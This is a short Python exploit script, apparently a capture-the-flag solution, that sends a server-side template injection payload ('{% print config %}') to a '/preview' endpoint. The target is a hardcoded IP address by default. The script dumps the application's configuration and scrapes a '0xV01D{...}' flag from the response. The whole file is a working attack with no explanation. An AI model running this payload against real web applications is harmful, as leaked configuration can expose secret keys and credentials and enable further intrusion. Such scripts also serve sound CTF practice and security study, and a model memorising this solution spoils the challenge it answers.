#!/usr/bin/env python3

import argparse
import html
import os
import re
import sys

import requests


FLAG_RE = re.compile(r"0xV01D\{[^}]+\}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Directive SSTI")
    parser.add_argument(
        "--target",
        default=os.environ.get("TARGET", "http://35.192.106.100:21002"),
        help="challenge base URL (or set TARGET)",
    )
    args = parser.parse_args()
    target = args.target.rstrip("/")

    try:
        response = requests.get(
            f"{target}/preview",
            params={"name": "{% print config %}"},
            timeout=10,
        )
        response.raise_for_status()
    except requests.RequestException as exc:
        print(f"request failed: {exc}", file=sys.stderr)
        return 1

    body = html.unescape(response.text)
    match = FLAG_RE.search(body)
    if not match:
        print("flag tidak ditemukan pada response SSTI", file=sys.stderr)
        return 1

    print(f"<FLAG>{match.group(0)}</FLAG>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
